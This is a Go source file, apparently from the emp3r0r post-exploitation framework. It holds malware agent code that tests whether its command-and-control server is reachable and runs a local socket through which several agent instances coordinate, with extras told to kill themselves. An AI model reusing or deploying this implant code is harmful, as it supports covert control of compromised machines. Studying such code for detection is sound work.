package main

import (
	"fmt"
	"net"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func isC2Reachable() bool {
	if common.RuntimeConfig.EnableNCSI {
		return transport.TestConnectivity(transport.UbuntuConnectivityURL, common.RuntimeConfig.C2TransportProxy)
	}

	logging.Println("NCSI is disabled, trying direct C2 connection")
	return transport.TestConnectivity(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
}

// AgentWaitQueue list of agents waiting to run
var AgentWaitQueue []int

// handle connections to our socket: tell them my PID
func socket_server(c net.Conn) {
	logging.Printf("Got connection from %s", c.RemoteAddr().String())
	// how many agents are waiting to run
	for {
		buf := make([]byte, 512)
		nr, err := c.Read(buf)
		if err != nil {
			return
		}
		pid_data := buf[0:nr]
		pid, err := strconv.ParseInt(string(pid_data), 10, 32)
		if err != nil {
			logging.Printf("Invalid PID from ping: %v", err)
			continue
		}
		logging.Printf("agent instance got ping from PID: %d", pid)

		// check if agents are still alive, remove dead agents
		for _, pid := range AgentWaitQueue {
			if !util.IsPIDAlive(int(pid)) {
				logging.Printf("Removing dead agent at PID: %d", pid)
				AgentWaitQueue = util.RemoveItemFromArray(int(pid), AgentWaitQueue)
			}
		}

		reply := fmt.Sprintf("%s running on PID %d", def.TransportString, os.Getpid())
		if len(AgentWaitQueue) > 3 {
			logging.Printf("Wait queue (sorted): %v", AgentWaitQueue)
			logging.Println("Too many agents waiting, will start to kill...")
			reply = "kill yourself"
		} else {
			AgentWaitQueue = append(AgentWaitQueue, int(pid))
			AgentWaitQueue = util.RemoveDupsFromArray(AgentWaitQueue)
			logging.Printf("Wait queue (sorted): %v", AgentWaitQueue)
			logging.Printf("We have %d agents in wait queue", len(AgentWaitQueue))
		}

		// Write reply
		_, err = c.Write([]byte(reply))
		if err != nil {
			logging.Printf("Write: %v", err)
		}
	}
}
